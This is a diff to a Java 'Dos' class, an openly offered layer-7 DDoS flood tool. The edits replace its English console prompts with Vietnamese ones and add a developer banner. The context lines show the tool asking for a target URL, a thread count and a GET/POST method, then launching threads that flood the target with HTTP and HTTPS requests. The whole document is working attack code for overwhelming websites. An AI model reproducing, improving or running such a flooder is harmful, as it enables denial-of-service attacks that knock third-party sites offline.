@@ -52,14 +52,14 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Thêm Url: ");
+        System.out.print("Wellcome To DDoS Attack Layer7\n Developer: Nguyễn Đăng Khoa\n Là một người thông minh hay sử dụng ddos đúng cách chứ đừng làm trẻ trâu ddos edu gov !\n\nThêm Url: ");
         url = in.nextLine();
         System.out.println("\n");
-        System.out.println("Starting Attack to url: " + url);
+        System.out.println("Bắt đầu cuộc tấn công tới url : " + url);
 
         String[] SUrl = url.split("://");
 
-        System.out.println("Checking connection to Site");
+        System.out.println("Load... Đang kiếm tra kết nối tới url");
         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method: ");
+        System.out.print("Methods (POST/GET): ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting Attack");
+        System.out.println("Bắt Đầu Tấn Công !");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("[POST] DangKhoaLuvNhuQuynh : " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("[GET] DangKhoaLuvNhuQuynh : " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("[GET] DangKhoaLuvNhuQuynh :" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("[GET] DangKhoaLuvNhuQuynh : " + responseCode + "Thread: " + this.seq);
     }
 }
